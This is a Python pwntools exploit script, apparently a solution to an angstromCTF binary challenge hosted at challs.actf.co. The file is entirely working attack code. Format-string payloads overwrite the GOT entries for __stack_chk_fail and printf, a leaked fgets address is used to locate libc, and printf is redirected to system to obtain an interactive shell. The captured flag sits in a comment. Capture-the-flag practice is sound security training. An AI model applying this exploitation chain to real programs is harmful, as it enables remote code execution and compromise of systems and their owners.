#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./og_patched")
libc=exe.libc

context.binary = exe

REMOTE_NC_CMD    = "nc challs.actf.co 31312"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *go+163
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = fmtstr_payload(6, {exe.got.__stack_chk_fail:exe.sym.main}).ljust(60, b"A")
    r.sendline(payload)

    payload = b"%7$sAAAA"+p64(exe.got.fgets).ljust(50, b"A")
    r.sendline(payload)

    r.recvuntil(b", \x80")
    leak = u64(b"\x80"+r.recv(5)+b"\x00\x00")
    libc.address = leak - libc.sym.fgets

    payload = fmtstr_payload(6, {exe.got.printf:libc.sym.system}, write_size="short")
    #gdb.attach(r, gdbscript=GDB_SCRIPT)
    r.sendline(payload)
    #actf{you_really_thought_you_could_overwrite_printf_with_system_huh}
    
    r.interactive()

if __name__ == "__main__":
    main()